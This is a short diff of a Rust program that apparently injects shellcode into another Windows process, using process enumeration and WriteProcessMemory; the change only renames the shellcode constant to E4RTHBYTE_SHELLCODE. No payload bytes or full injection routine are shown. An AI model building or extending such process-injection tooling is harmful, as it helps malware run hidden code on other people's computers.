@@ -3,7 +3,7 @@ use std::mem;
 use std::process::exit;
 use std::thread::sleep;
 use std::time::Duration;
-use injector::SHELL_CODE;
+use injector::E4RTHBYTE_SHELLCODE;
 use windows::{
     Win32::System::Diagnostics::ToolHelp::{CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS},
     Win32::System::Diagnostics::Debug::{WriteProcessMemory},
@@ -73,7 +73,7 @@ fn main() {
             unreachable!()
         };
 
-        let buffer = SHELL_CODE;
+        let buffer = E4RTHBYTE_SHELLCODE;
         let buffer_size: usize = buffer.len();
 
         msg(format!("Buffer size: {}", buffer_size).as_str());
